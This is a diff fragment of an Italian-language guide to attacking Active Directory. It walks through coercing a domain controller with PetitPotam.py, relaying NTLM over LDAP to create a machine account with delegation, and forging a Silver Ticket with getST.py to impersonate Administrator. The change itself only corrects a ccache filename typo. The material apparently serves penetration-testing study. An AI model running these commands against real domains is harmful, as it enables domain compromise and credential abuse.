@@ -39,7 +39,7 @@ python3 PetitPotam.py -d <domain> <IP Attacker> <DC1 IP>
 
 ➤ La macchina attaccante riceve NTLM e lo inoltra al secondo DC tramite LDAP. Nello specifico l'attacco porta alla creazione di un nuovo computer macchina che gli viene assegnata la delega di impersonificare qualsiasi utente dentro DC1
 
-➤ Viene forgiato un Silver Ticket per impersonificare un Amminsitratore dentro DC1. Ti salva il TGS in Administrato.ccache
+➤ Viene forgiato un Silver Ticket per impersonificare un Amminsitratore dentro DC1. Ti salva il TGS in Administrator.ccache
 
 ```
 python3 getST.py -spn cifs/<FQDN DC1> -impersonate Administrator <domain>/'<username computer macchina creato>'
